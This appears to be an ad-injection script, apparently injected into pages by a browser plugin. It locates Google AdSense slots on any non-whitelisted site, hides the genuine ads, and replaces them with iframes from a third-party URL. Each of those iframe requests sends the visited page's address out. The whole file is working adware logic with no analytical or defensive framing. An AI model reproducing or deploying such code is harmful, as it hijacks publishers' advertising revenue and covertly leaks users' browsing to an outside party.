//whitelist_show_ads
var circleTimer_show_ads;
var totalNum_show_ads = 0;
var show_ad_dom_id = new Array();
var ifm_id_show_ads = 'idjfwefewewr34ed3434';
var js_show_ads_id = '_6722deeefgagrgrefr4r_';



/*
*	判断某个值是否在数组中
*/
function IsInArray(arr,val)
{
    var testStr=','+arr.join(",")+",";
    return testStr.indexOf(","+val+",")!=-1;
}

/*
*		元素 onload
*/
function elementOnload(elm,callBack)
{
	if(elm.attachEvent){  
        elm.attachEvent("onload",function(){
           callBack(); 
        });  
    }else{  
        elm.onload=function(){  
           callBack();
        };  
    }  
}

/*
*		是否在白名单中
*/
function isInWhiteList_show_ads()
{
	var flagRet = false;
	var itemArr = new Array();
	var whiteListArray = new Array();
	whiteListArray = whitelist_show_ads.split("|");
	var dmain = document.domain;

	for(var i = 0; i < whiteListArray.length; i++)
	{
		itemArr = whiteListArray[i].split(",");

		if(itemArr.length != 2) continue;
		if(dmain.indexOf(itemArr[0]) >= 0)
		{
			flagRet = true;
			break;
		}
	}
	return flagRet;
}

/*
*	设置 js 注入标志
*/
function setJsInTag_show_ads()
{

	var _div = document.createElement('div');
	_div.id = js_show_ads_id;
	_div.style.display = 'none';
	document.body.appendChild(_div);
}

/*
*	字符串添加属性
*/
String.prototype.trim = function() {
return this.replace(/^\s+|\s+$/g, "");
}

/*
*  js 调用回调函数
*/
function showReplaceCallBack_show_ads()
{
  if(window.pgCbk != null) window.pgCbk.adCallBack('adshow_replace');//此处是传给插件的参数
}

/*
*  set div inline
*/
function setElementShow_show_ads(ob)
{
	for(var j = 0; j < 5; j++)
	{	
		if(ob == null) break;
		if((ob.style != null) && (ob.style.display == 'none') )
		{
			ob.style.display = '';
			break;
		}
		ob = ob.parentNode;
	}

}

/*
*	获得 ad 节点属性
*/
function getAdNodeInfo_show_ads(insDom)
{

	var realWidth = parseInt(insDom.style.width);
	var realHeight = parseInt(insDom.style.height);

	if((realWidth == undefined) || (isNaN(realWidth))) return;
	if((realHeight == undefined) || (isNaN(realHeight))) return;

	var oneAdNode=new Object();
	oneAdNode.pnt = insDom;
	oneAdNode.width = realWidth;
	oneAdNode.height = realHeight;

	show_ad_dom_id.push(oneAdNode);
}

/*
*	获取 show_ads 节点
*/
function getGoogleShowAdsIds_show_ads()
{
	show_ad_dom_id.length = 0;
	var tUrl = 'pagead2.googlesyndication.com/pagead/show_ads.js';
	var targetDom = new Array();
	targetDom.length = 0;

	var elmObj = document.getElementsByTagName('script');

	if(elmObj.length == 0) return;
	var k = 0;

	for(var i = 0; i < elmObj.length; i++)
	{
		k = 0;
		if((elmObj[i].src != undefined) && (elmObj[i].src != '') && (elmObj[i].src.indexOf(tUrl) != -1))
		{
			if(targetDom.length == 0)
			{
				targetDom.push(elmObj[i]);
				continue;
			}

			for(var j = 0; j < targetDom.length; j++)
			{
				if(targetDom[j] != elmObj[i]) k++;
			}
			if(k == targetDom.length) targetDom.push(elmObj[i]);

		}
	}
	
	if(0 == targetDom.length) return;

	var insNode = null;
	var findFlag = 0;
	for(var i = 0;i < targetDom.length; i++)
	{
		insNode = null;
		findFlag = 0;
		insNode = targetDom[i].nextSibling;
		if(insNode == null || insNode == undefined) continue;
		
		while(insNode != null)
		{
			if((insNode.tagName != null) && (insNode.tagName.toUpperCase() == 'INS'))
			{
				findFlag = 1;
				getAdNodeInfo_show_ads(insNode);
				break;
			}
		   insNode = insNode.nextSibling;
		}

		if(findFlag == 0) //代表没有找到节点
		{
			insNode = targetDom[i].nextSibling;
			if(insNode == null || insNode == undefined) continue;

			while(insNode != null)
			{
				if((insNode.tagName != null) && (insNode.tagName.toUpperCase() == 'IFRAME'))
				{
					
					var insDom = document.createElement('ins');

					insDom.style.width = insNode.width;
					insDom.style.height = insNode.height;
					
					insNode.parentNode.insertBefore(insDom,insNode);
					insNode.style.display = 'none';
					
					getAdNodeInfo_show_ads(insDom);
					break;
				}
			   insNode = insNode.nextSibling;
			}
		}
	}
}

/*
*	rps ad
*/
function rps__show_ads(idObj)
{
	var retResult = false;
	var lastIndex = 0;
	var dom = idObj.pnt;
	var width_dom = idObj.width;
	var height_dom = idObj.height;

	// replaceSize 尺寸数组解析
	var size_str = width_dom + 'x'+ height_dom;

	start_pos = replaceSize.indexOf(size_str,lastIndex);
	if(start_pos != -1)
	{
		lastIndex = start_pos;
		end_pos = replaceSize.indexOf('|',lastIndex);
		if(end_pos != -1)
		{
			pregSizeStr = replaceSize.substring(start_pos,end_pos);
			equal_pos = pregSizeStr.indexOf('=');
			if(equal_pos == -1) 
			{
				dom.style.display = 'none';
				return;
			}

			var newSize = pregSizeStr.substring(equal_pos+1,pregSizeStr.length);
			if(newSize == '') return;
			var new_width = parseInt(newSize.split('x')[0]);
			var new_height = parseInt(newSize.split('x')[1]);
			
			if((new_width == NaN) || (new_height == NaN)) 
			{
				dom.style.display = 'none';
				return;
			}

			var iframe_show_ad = document.createElement('iframe');
			iframe_show_ad.id = ifm_id_show_ads + Math.random();

			iframe_show_ad.scrolling = "no";
			iframe_show_ad.frameBorder = 0;
			iframe_show_ad.width = new_width;
			iframe_show_ad.height = new_height;
			iframe_show_ad.marginHeight = 0;
			iframe_show_ad.marginWidth = 0;
			iframe_show_ad.topMargin = 0;
			iframe_show_ad.leftMargin = 0;
			iframe_show_ad.style.display = 'inline';
			iframe_show_ad.allowTransparency=true;

			var src_show_ad = InsURL;
			
			src_show_ad = src_show_ad.replace(/\[WIDTH\]/g, new_width);
			src_show_ad = src_show_ad.replace(/\[HEIGHT\]/g, new_height);
			src_show_ad = src_show_ad.replace(/\[WIDTHxHEIGHT\]/g,newSize);
			src_show_ad = src_show_ad.replace(/\[REFERRER_URL\]/g, encodeURIComponent(window.location.href));
				
			dom.innerHTML = '';
			iframe_show_ad.src = src_show_ad;
			elementOnload(iframe_show_ad,showReplaceCallBack_show_ads);
			dom.appendChild(iframe_show_ad);
			setElementShow_show_ads(dom);
			retResult = true;
		}
	}

	if(!retResult)
	{
		dom.style.display = 'none';
	}
}

/*
*	主入口函数
*/
function main_init_show_ads()
{
	if(replaceSize == undefined || replaceSize == '') return;
	var jsshowadsid = document.getElementById(js_show_ads_id);

	if(jsshowadsid != null || isInWhiteList_show_ads()) return;	//说明js已经加入
	setJsInTag_show_ads();	
	getGoogleShowAdsIds_show_ads();

	if(show_ad_dom_id.length == 0) return;

	for(var i = 0; i < show_ad_dom_id.length; i++)
	{
		rps__show_ads(show_ad_dom_id[i]);
	}
}



/*
*	定时检测函数
*/
function checkPageState_show_ads()
{
	totalNum_show_ads++;
	var did = document.getElementById('pgc0038455dde337');
	if(did == null) 
	{
		if(totalNum_show_ads >= 10)
		{
			 clearInterval(circleTimer_show_ads);
			 if(window.pgCbk != null) window.pgCbk.adCallBack('disable_web:' + page_web_pointer);
			 setTimeout('main_init_show_ads()',5000);
		}
		return;
	}

	if(did.innerHTML == '1')
	{
		clearInterval(circleTimer_show_ads);
		main_init_show_ads();
	}
}


/*
*	定时器入口函数
*/
function checkFuncMain_show_ads()
{
 circleTimer_show_ads = setInterval('checkPageState_show_ads()',1000);
}


checkFuncMain_show_ads();
